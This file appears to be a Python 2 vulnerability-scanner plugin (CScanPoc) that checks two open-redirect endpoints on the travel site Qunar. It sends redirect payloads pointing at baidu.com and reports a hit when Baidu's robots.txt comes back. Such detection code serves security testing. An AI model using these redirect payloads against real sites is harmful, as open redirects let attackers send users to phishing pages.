# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Qunar_0001' # 平台漏洞编号
    name = '去哪儿两处URL跳转' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2011-03-21'  # 漏洞公布时间
    desc = '''
        去哪儿两处URL跳转漏洞，攻击者可以通过构造恶意链接来跳转到恶意网站对用户进行钓鱼攻击。
    ''' # 漏洞描述
    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=1347
    cnvd_id = 'Uknown' # cnvd漏洞编号
    cve_id = 'Uknown'  # cve编号
    product = '去哪儿'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '99a1474b-37d0-4503-898b-5470c25098b4' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = ['/live/wndj.php?bannerid=bomberman&dest=','/redirect.php?url=']
            for payload in payloads:
                vul_url = arg + payload + 'http://baidu.com/robots.txt'
                response = requests.get(vul_url)
                if response.status_code ==200 and 'Baiduspider' in response.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
